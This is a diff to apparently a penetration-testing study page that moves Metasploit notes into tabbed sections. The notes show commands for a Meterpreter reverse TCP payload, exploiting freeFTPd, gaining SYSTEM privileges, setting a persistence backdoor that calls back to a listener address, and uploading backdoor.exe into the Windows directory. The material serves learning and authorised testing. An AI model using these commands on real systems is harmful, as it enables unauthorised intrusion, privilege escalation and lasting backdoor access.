@@ -274,9 +274,11 @@ A payload is used by an attacker to get:
 
 A special payload, with many useful features under the penetration testing point of view is `meterpreter`.
 
+{% tabs %}
+{% tab title="Start MSF" %}
 ```bash
-service postgresql start
-msfconsole
+$ service postgresql start
+$ msfconsole
 > help
 > show -h
 > search <searchterm> # search for a specific module by using the search cmd
@@ -291,7 +293,9 @@ msfconsole
 > set payload windows/meterpreter/reverse_tcp
 > exploit
 ```
+{% endtab %}
 
+{% tab title="Exploit freeftpd" %}
 ```bash
 # Exploit freeftpd
 > use exploit/windows/ftp/freeftpd_pass
@@ -308,7 +312,9 @@ msfconsole
 # Obtain System privileges on the machine
 > getsystem
 ```
+{% endtab %}
 
+{% tab title="Set backdoor" %}
 ```bash
 # Set backdoor
 use exploit/windows/local/persistence
@@ -321,16 +327,22 @@ set exitfunc process
 set lhost 192.168.99.100
 set lport 5555
 set DisablePayloadHandler false
-exploit //if the backdoor doesn't start immediately, use "exploit -j" instead
+exploit 
+# if the backdoor doesn't start immediately, use 
+# "exploit -j" instead
 ```
+{% endtab %}
+{% endtabs %}
 
 ## Meterpreter
 
-> Ability to:
->
-> * Get a powerful shell on an exploited machine
-> * Take control over an exploited machine
-> * Install backdoors
+{% hint style="info" %}
+**Goals**
+
+* Get a powerful shell on an exploited machine
+* Take control over an exploited machine
+* Install backdoors
+{% endhint %}
 
 Provides advanced features to:
 
@@ -375,9 +387,7 @@ Inside a `msfconsole`:
 > download HaxLogs.log /root/
 > upload /root/backdoor.exe c:\\Windows # note the backslash escaping
 > shell
-```
 
-```bash
 # Is UAC enabled?
 run post/windows/gather/win_privs
 ```
